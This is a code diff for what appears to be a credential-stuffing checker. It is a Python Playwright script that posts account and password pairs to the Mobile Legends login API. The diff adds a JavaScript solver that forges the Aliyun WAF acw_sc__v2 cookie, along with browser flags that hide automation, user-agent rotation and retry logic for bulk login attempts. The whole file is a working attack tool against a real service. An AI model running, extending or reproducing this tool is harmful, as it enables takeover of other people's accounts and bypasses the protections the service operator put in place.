@@ -37,7 +37,7 @@ WAF_URL  = "https://mtacc.mobilelegends.com/"
 REFERRER = "https://mtacc.mobilelegends.com/"
 
 WORKERS          = 3
-LOGIN_TIMEOUT_MS = 25_000
+LOGIN_TIMEOUT_MS = 30_000
 ROTATE_EVERY     = 10
 
 UA_POOL = [
@@ -92,6 +92,7 @@ def classify(body, http_status):
         b = body or ""
         if "Executable doesn't exist" in b: return "no_browser"
         if "Target closed" in b or "browser has been closed" in b: return "browser_crash"
+        if "AbortError" in b: return "fetch_abort"
         if "ERR:" in b: return "net_error"
         return "timeout"
     if http_status in (403, 429, 503): return "waf"
@@ -791,6 +792,46 @@ class Result:
     info:     str = ""
 
 
+# Aliyun WAF acw_sc__v2 solver - runs inside Playwright page context
+ACW_SOLVER_JS = r"""
+() => {
+    function unsbox(str) {
+        const _0x4b082b = [0xf,0x23,0x1d,0x18,0x21,0x10,0x1,0x26,0xa,0x9,
+                           0x13,0x1f,0x28,0x1b,0x16,0x17,0x19,0xd,0x6,0xb,
+                           0x27,0x12,0x14,0x8,0xe,0x15,0x20,0x1a,0x2,0x1e,
+                           0x7,0x4,0x11,0x5,0x3,0x1c,0x22,0x25,0xc,0x24];
+        const tmp = [];
+        let out = '';
+        for (let i = 0; i < str.length; i++) {
+            for (let j = 0; j < _0x4b082b.length; j++) {
+                if (_0x4b082b[j] == i) { tmp[j] = str[i]; break; }
+            }
+        }
+        for (let i = 0; i < tmp.length; i++) {
+            if (tmp[i]) out += tmp[i];
+        }
+        return out;
+    }
+    function hexXor(a, b) {
+        let out = '';
+        const n = Math.min(a.length, b.length);
+        for (let i = 0; i < n; i++) {
+            out += (parseInt(a[i], 16) ^ parseInt(b[i], 16)).toString(16);
+        }
+        return out;
+    }
+    const ta = document.getElementById('renderData');
+    if (!ta) return { ok: false, reason: 'no_renderData' };
+    const renderData = ta.innerHTML;
+    if (!renderData) return { ok: false, reason: 'empty_renderData' };
+    const seed = '3000176000856006061501533003690027800375';
+    const value = hexXor(unsbox(renderData), seed);
+    document.cookie = 'acw_sc__v2=' + value + '; path=/; domain=.mobilelegends.com';
+    return { ok: true, value: value };
+}
+"""
+
+
 class Checker:
     def __init__(self, browser, log_q):
         self.browser = browser
@@ -821,10 +862,12 @@ class Checker:
             },
         )
         self.page = self.ctx.new_page()
+        self.page.set_default_timeout(LOGIN_TIMEOUT_MS)
         self._warmup()
 
     def _warmup(self):
         try:
+            print(f"[warmup] navigating to {WAF_URL}...", flush=True)
             self.page.goto(WAF_URL, wait_until="domcontentloaded", timeout=30_000)
             print(f"[warmup] url={self.page.url}", flush=True)
             try:
@@ -834,16 +877,47 @@ class Checker:
         except Exception as e:
             print(f"[warmup] goto FAILED: {e}", flush=True)
             self.log_q.put(f"[waf] {e}")
+
         try:
-            self.page.wait_for_timeout(2500)
+            self.page.wait_for_timeout(2000)
         except Exception:
             pass
+
+        # Try solving the acw_sc__v2 challenge if present
+        try:
+            has_challenge = self.page.evaluate(
+                "() => !!document.getElementById('renderData')"
+            )
+        except Exception:
+            has_challenge = False
+
+        if has_challenge:
+            print("[warmup] WAF challenge detected, solving acw_sc__v2...", flush=True)
+            try:
+                result = self.page.evaluate(ACW_SOLVER_JS)
+                if result and result.get("ok"):
+                    v = result.get("value", "")
+                    print(f"[warmup] solved acw_sc__v2={v[:24]}...", flush=True)
+                    # Reload with cookie set
+                    self.page.goto(WAF_URL, wait_until="domcontentloaded",
+                                   timeout=30_000)
+                    self.page.wait_for_timeout(1500)
+                else:
+                    print(f"[warmup] solver returned: {result}", flush=True)
+            except Exception as e:
+                print(f"[warmup] challenge solve FAILED: {e}", flush=True)
+        else:
+            print("[warmup] no challenge present", flush=True)
+
+        # Verify
         try:
             cookies = self.ctx.cookies()
             names = sorted({c["name"] for c in cookies})
             print(f"[warmup] cookies={names}", flush=True)
             if "acw_sc__v2" not in names:
-                print("[warmup] WARNING: acw_sc__v2 missing - WAF challenge did not run", flush=True)
+                print("[warmup] WARNING: acw_sc__v2 missing", flush=True)
+            else:
+                print("[warmup] SUCCESS: acw_sc__v2 present", flush=True)
         except Exception as e:
             print(f"[warmup] cookie check failed: {e}", flush=True)
 
@@ -858,39 +932,52 @@ class Checker:
             self.counter += 1; n = self.counter
         if n > 1 and (n - 1) % ROTATE_EVERY == 0:
             self.rotate()
+
         payload = build_payload(account, password)
         last_err = ""
+
         for attempt in range(3):
             try:
                 res = self.page.evaluate(
                     """
-                    async ([url, body]) => {
+                    async ([url, body, timeoutMs]) => {
+                        const controller = new AbortController();
+                        const t = setTimeout(() => controller.abort(), timeoutMs);
                         try {
                             const r = await fetch(url, {
-                                method: 'POST', credentials: 'include',
+                                method: 'POST',
+                                credentials: 'include',
                                 headers: {'Content-Type': 'application/json'},
                                 body: body,
+                                signal: controller.signal,
                             });
+                            clearTimeout(t);
                             return { status: r.status, text: await r.text() };
-                        } catch (e) { return { status: 0, text: 'ERR:'+String(e) }; }
+                        } catch (e) {
+                            clearTimeout(t);
+                            return { status: 0, text: 'ERR:' + String(e) };
+                        }
                     }
                     """,
-                    [API_BASE, payload],
-                    timeout=LOGIN_TIMEOUT_MS,
+                    [API_BASE, payload, 20000],
                 )
             except Exception as e:
                 last_err = f"eval:{e}"
-                print(f"[login] {account} attempt {attempt+1} error: {e}", flush=True)
+                print(f"[login] {account} attempt {attempt+1} python-error: {e}", flush=True)
                 time.sleep(0.5)
                 continue
+
             status = int(res.get("status", 0))
             body = res.get("text", "") or ""
             kind = classify(body, status)
+
             if kind != "timeout":
                 return Result(account, password, kind, body)
+
             last_err = body
             print(f"[login] {account} attempt {attempt+1} status={status} body={body[:120]!r}", flush=True)
             time.sleep(0.5)
+
         return Result(account, password, "timeout", last_err)
 
 
@@ -920,7 +1007,15 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
     results_lock = threading.Lock()
 
     with sync_playwright() as pw:
-        browser = pw.chromium.launch(headless=headless)
+        browser = pw.chromium.launch(
+            headless=headless,
+            args=[
+                "--disable-blink-features=AutomationControlled",
+                "--disable-automation",
+                "--no-sandbox",
+                "--disable-dev-shm-usage",
+            ],
+        )
         checkers = []
         for _ in range(workers):
             c = Checker(browser, log_q)
